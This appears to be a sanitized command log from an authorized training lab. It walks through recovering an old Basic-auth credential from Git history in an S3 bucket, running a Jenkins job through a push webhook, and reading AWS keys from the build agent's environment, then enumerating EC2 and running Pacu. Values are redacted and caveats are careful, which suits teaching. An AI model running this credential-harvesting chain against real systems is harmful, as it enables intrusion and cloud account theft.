# Sanitized command and output record

**Scope: Lab 1 — exposed Git history and Jenkins pipeline execution.** [Case study](../labs/01-git-jenkins-aws.md)

[Back to README](../README.md)

## Provenance and scope

Zavan Fahim supplied these 34 sections as a sanitized record from an authorized training lab. Commands and output excerpts below are based on that supplied text, with additional identifiers generalized. They have not been independently rerun or authenticated against original terminal logs. The supplied outputs may be abbreviated; no full session continuity or original timestamps are asserted. Placeholders make these examples unsuitable for direct execution.

All supplied command lines are retained, including unsuccessful attempts. Exact course script bodies, historical source diffs, and pipeline source are replaced with clearly labeled editorial summaries; these summaries are not terminal output. Section 16 contained source configuration rather than a shell command. Credential values, flags, names, addresses, identifiers, and keys are removed or generalized. No remediation implementation or retest is claimed.


## 1. Lab DNS Resolution

```bash
dig @<LAB_DNS_IP> app.example.invalid
```

```text
; <<>> DiG <<>> @<LAB_DNS_IP> app.example.invalid

;; ->>HEADER<<- opcode: QUERY, status: NOERROR

;; QUESTION SECTION:
;app.example.invalid.              IN      A

;; ANSWER SECTION:
app.example.invalid.       60      IN      A       <APPLICATION_IP>

;; Query time: 32 msec
;; SERVER: <LAB_DNS_IP>#53
```

```bash
dig @<LAB_DNS_IP> scm.example.invalid
dig @<LAB_DNS_IP> ci.example.invalid
```


## 2. Web Application Enumeration

```bash
curl http://app.example.invalid
```

```html
<!doctype html>
<html lang="en">

<head>
    <title>Coming Soon</title>
</head>

<body>

<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">

<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">

<p hidden><LAB_FLAG_REMOVED></p>

</body>
</html>
```


## 3. Extracting the S3 Bucket Reference

```bash
curl http://app.example.invalid | grep -i s3
```

```text
<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">

<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">

<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">

<img src="https://<BUCKET_NAME>.s3.<REGION>.amazonaws.com/images/<ASSET_NAME>">
```

```text
<BUCKET_NAME>
```


## 4. AWS Identity Validation

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "<REDACTED_USER_ID>",
    "Account": "<AWS_ACCOUNT_ID>",
    "Arn": "arn:aws:iam::<AWS_ACCOUNT_ID>:user/<INITIAL_IDENTITY>"
}
```

**Interpretation / limitation:** STS identifies the active identity; it does not enumerate effective permissions.

## 5. Attempting Global S3 Enumeration

```bash
aws s3 ls
```

```text
An error occurred (AccessDenied) when calling the ListBuckets operation:

User: arn:aws:iam::<AWS_ACCOUNT_ID>:user/<INITIAL_IDENTITY>
is not authorized to perform: s3:ListAllMyBuckets
```

**Interpretation / limitation:** This denial establishes that this request could not list all buckets, not that all S3 access was denied.

## 6. Listing the Known S3 Bucket

```bash
aws s3 ls s3://<BUCKET_NAME>
```

```text
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2026-XX-XX XX:XX:XX        972 CONTRIBUTING.md
2026-XX-XX XX:XX:XX         79 Caddyfile
2026-XX-XX XX:XX:XX        407 Jenkinsfile
2026-XX-XX XX:XX:XX        879 README.md
2026-XX-XX XX:XX:XX        176 docker-compose.yml
```

**Interpretation / limitation:** The listing was made with configured AWS credentials. Anonymous public access is not demonstrated.

## 7. Downloading the Bucket

```bash
aws s3 sync s3://<BUCKET_NAME> ~/static_content
```

```text
download: s3://<BUCKET_NAME>/.git/COMMIT_EDITMSG to static_content/.git/COMMIT_EDITMSG

download: s3://<BUCKET_NAME>/README.md to static_content/README.md

download: s3://<BUCKET_NAME>/Jenkinsfile to static_content/Jenkinsfile

download: s3://<BUCKET_NAME>/scripts/update-readme.sh to static_content/scripts/update-readme.sh

download: s3://<BUCKET_NAME>/images/example.jpg to static_content/images/example.jpg
```


## 8. Inspecting the Downloaded Repository

```bash
ls -la
```

```text
total 44
drwxrwxr-x  6 user user 4096 .
drwx------ 36 user user 4096 ..
-rw-rw-r--  1 user user   79 Caddyfile
-rw-rw-r--  1 user user  972 CONTRIBUTING.md
-rw-rw-r--  1 user user  176 docker-compose.yml
drwxrwxr-x  7 user user 4096 .git
drwxrwxr-x  2 user user 4096 images
-rw-rw-r--  1 user user  407 Jenkinsfile
-rw-rw-r--  1 user user  879 README.md
drwxrwxr-x  2 user user 4096 scripts
drwxrwxr-x  2 user user 4096 webroot
```


## 9. Reviewing Repository Scripts

```bash
cat scripts/update-readme.sh
```

**Source output omitted:** the supplied script accepted a username and password, constructed a Basic Authentication header, and queried the SCM collaborators endpoint. This editorial summary replaces the course script body.


## 10. Automated Secret Scanning

```bash
gitleaks detect
```

```text
○
│╲
│ ○
○ ░
░    gitleaks

INF no leaks found
INF scan completed
```

**Interpretation / limitation:** The scanner reported no leaks for this run; its version, configuration, and scan scope are not preserved.

## 11. Reviewing Git History

```bash
git log --oneline
```

```text
<COMMIT_A> Add Jenkinsfile
<COMMIT_B> Fix issue
<COMMIT_C> Add Management Scripts
<COMMIT_D> update CONTRIBUTING
<COMMIT_E> add Docker
<COMMIT_F> Add index.html
<COMMIT_G> Add images
<COMMIT_H> Init Repo
```


## 12. Inspecting the Suspicious Commit

```bash
git show <FIX_ISSUE_COMMIT>
```

**Source diff omitted:** the supplied historical diff removed a hard-coded Basic Authentication header and changed the script to accept credentials as arguments. This editorial summary replaces the course source diff.


## 13. Extracting the Historical Authentication Value

```bash
git show <FIX_ISSUE_COMMIT> | grep "authorization: Basic"
```

```text
-USERNAMES=$(curl ... -H 'authorization: Basic <REDACTED_BASE64>' ...)
```


## 14. Decoding the Historical Credential

```bash
echo "<REDACTED_BASE64>" | base64 -d
```

```text
<SCM_USERNAME>:<REDACTED_PASSWORD>
```

**Interpretation / limitation:** The supplied narrative reports successful SCM authentication with the historical credential. No authentication response is included.

## 15. Searching Historical Commits for Flags

```bash
git grep -n "<LAB_FLAG_PREFIX>" $(git rev-list --all)
```

```text
<COMMIT_HASH>:CONTRIBUTING.md:5:<LAB_FLAG_REMOVED>
```


## 16. Jenkins Pipeline Discovery

**Configuration source omitted:** the supplied Jenkins pipeline validated a CloudFormation template and updated a stack within an AWS credential-binding block. The binding identifier is generalized as `<CREDENTIAL_BINDING>`. This is an editorial summary, not reproduced source or terminal output.


## 17. Gitea Webhook Validation

```text
Request URL:
http://ci.example.invalid/gogs-webhook/?job=<PIPELINE_JOB>

Request method:
POST

X-Gitea-Event: push
X-Gogs-Event: push
```

```text
Response 200
```

```json
{
  "result": "OK",
  "message": "Job '<PIPELINE_JOB>' is executed"
}
```

**Interpretation / limitation:** The response associates the push webhook with job execution. It does not by itself document the exact pipeline modification.

## 18. Jenkins Build Agent Shell

```text
jenkins@<CONTAINER_ID>:~/agent/workspace/<PIPELINE_JOB>$
```

```bash
whoami
```

```text
jenkins
```


## 19. Kernel Enumeration

```bash
uname -a
```

```text
Linux <CONTAINER_ID> 4.14.x-amzn2.x86_64
#1 SMP
x86_64 GNU/Linux
```

**Interpretation / limitation:** The kernel string is consistent with an Amazon Linux-related host kernel; it does not identify the container userland.

## 20. Operating System Enumeration

```bash
cat /etc/os-release
```

```text
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
```


## 21. Jenkins Workspace

```bash
ls
```

```text
Jenkinsfile
README.md
<TEMPLATE_FILE>
```


## 22. Jenkins Home Enumeration

```bash
cd ~
ls -a
```

```text
.
..
.bash_logout
.bashrc
.cache
.config
.profile
.ssh
agent
```


## 23. SSH Configuration

```bash
ls -a ~/.ssh
```

```text
.
..
authorized_keys
```

```bash
cat ~/.ssh/authorized_keys
```

```text
ssh-rsa <PUBLIC_KEY_REMOVED> <COMMENT_REMOVED>
```

**Interpretation / limitation:** An authorized_keys entry permits corresponding key authentication subject to SSH configuration. It does not alone establish which controller used it.

## 24. Network Utility Checks

```bash
ifconfig
```

```text
bash: ifconfig: command not found
```

```bash
ip a
```

```text
bash: ip: command not found
```

**Interpretation / limitation:** Missing network utilities indicate a minimal environment; they do not alone establish containerization.

## 25. Container Mount Enumeration

```bash
cat /proc/mounts
```

```text
overlay / overlay rw,relatime,lowerdir=<REDACTED>,upperdir=<REDACTED>,workdir=<REDACTED> 0 0

proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0

tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0

/dev/xvda1 /home/jenkins xfs rw,noatime 0 0

/dev/xvda1 /etc/resolv.conf xfs rw,noatime 0 0

/dev/xvda1 /etc/hostname xfs rw,noatime 0 0

/dev/xvda1 /etc/hosts xfs rw,noatime 0 0
```

**Interpretation / limitation:** Overlay and bind mounts are consistent with containerization. These entries alone do not conclusively identify Docker or prove host compromise.

## 26. Linux Capability Enumeration

```bash
cat /proc/1/status | grep Cap
```

```text
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

```bash
capsh --decode=0000003fffffffff
```

```text
cap_chown
cap_dac_override
cap_dac_read_search
cap_fowner
cap_setgid
cap_setuid
cap_net_admin
cap_net_raw
cap_sys_module
cap_sys_ptrace
cap_sys_admin
cap_sys_boot
cap_sys_resource
...
```

**Interpretation / limitation:** The supplied PID 1 masks and abbreviated capability decode indicate broad privileges. They do not prove every process has those effective capabilities or demonstrate a container escape.

## 27. Jenkins Environment Variables

```bash
env
```

```text
SHELL=/bin/bash

AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1

AWS_SECRET_ACCESS_KEY=<REDACTED>
AWS_ACCESS_KEY_ID=<REDACTED>

JENKINS_URL=http://ci.example.invalid/
JOB_NAME=<PIPELINE_JOB>
JENKINS_AGENT_HOME=/home/jenkins

WORKSPACE=/home/jenkins/agent/workspace/<PIPELINE_JOB>

GIT_URL=http://scm.example.invalid/<SCM_OWNER>/<PIPELINE_JOB>.git
GIT_BRANCH=gitea/master

FLAG=<LAB_FLAG_REMOVED>

USER=jenkins
HOME=/home/jenkins

CI=true
```

**Interpretation / limitation:** AWS variables were visible to the job. Credential injection is expected for some trusted jobs; the risk is access by untrusted code that can execute in that context.

## 28. Finding AWS Credentials

```bash
env | grep AWS
```

```text
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=<REDACTED>
AWS_ACCESS_KEY_ID=<REDACTED>
```


## 29. Finding the Environment Flag

```bash
env | grep -i flag
```

```text
FLAG=<LAB_FLAG_REMOVED>
```


## 30. Validating the Jenkins AWS Identity

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "<REDACTED_USER_ID>",
    "Account": "<AWS_ACCOUNT_ID>",
    "Arn": "arn:aws:iam::<AWS_ACCOUNT_ID>:user/<BUILD_IDENTITY>"
}
```

**Interpretation / limitation:** The identity name does not establish administrator privileges. The later EC2 response demonstrates a specific successful read operation.

## 31. AWS CLI Profile

```bash
aws configure --profile <LOCAL_PROFILE>
```

```text
AWS Access Key ID: <REDACTED>
AWS Secret Access Key: <REDACTED>
Default region name: us-east-1
Default output format: json
```

```bash
aws configure list --profile <LOCAL_PROFILE>
```

```text
NAME       : VALUE                    : TYPE
profile    : <LOCAL_PROFILE>       : manual
access_key : <MASKED_CREDENTIAL>     : shared-credentials-file
secret_key : <MASKED_CREDENTIAL>     : shared-credentials-file
region     : us-east-1                : config-file
```

**Interpretation / limitation:** The source used a named local AWS profile. The subsequent command in section 32 does not explicitly select it; profile continuity cannot be verified from these excerpts.

## 32. EC2 Enumeration

```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].Tags'
```

```json
[
    [
        {
            "Key": "Name",
            "Value": "<REDACTED_INSTANCE_NAME>"
        },
        {
            "Key": "flag",
            "Value": "<LAB_FLAG_REMOVED>"
        }
    ]
]
```

**Interpretation / limitation:** The supplied response records EC2 tag-read access. A lab-answer tag is represented by a generic placeholder. This is not evidence of production data exposure or unrestricted cloud access.

## 33. Pacu Permission Enumeration

```text
run iam__enum_permissions
```

```text
[iam__enum_permissions] Confirming permissions for users:

[iam__enum_permissions]   <INITIAL_IDENTITY>...

List groups for user failed
FAILURE: MISSING REQUIRED AWS PERMISSIONS

List user policies failed
FAILURE: MISSING REQUIRED AWS PERMISSIONS

List attached user policies failed
FAILURE: MISSING REQUIRED AWS PERMISSIONS

MODULE SUMMARY:

0 Confirmed permissions for 0 user(s).
0 Confirmed permissions for 0 role(s).
```

**Interpretation / limitation:** The module did not confirm permissions. This is not proof that the identity has no permissions; its inspection requests failed.

## 34. Pacu S3 Module

```text
run s3__download_bucket
```

```text
[s3__download_bucket] Enumerating buckets...

FAILURE: MISSING AWS PERMISSIONS

MODULE SUMMARY:

No actions were taken.
```

**Interpretation / limitation:** The module reported that it took no actions. Direct access to a known bucket can differ from a module workflow that first enumerates buckets.

## Findings supported by the record

The excerpts document known-bucket Git metadata access, manual discovery of historical authentication material, a push-triggered Jenkins job, a Jenkins shell identity, container-related mount and capability observations, AWS credential variables, STS identity validation, and successful EC2 tag enumeration. SCM authentication and the pipeline modification sequence are reported in the accompanying supplied account; their complete request/response and execution chain are not present here. This record does not establish anonymous bucket access, AWS administrator permissions, or a successful container escape.
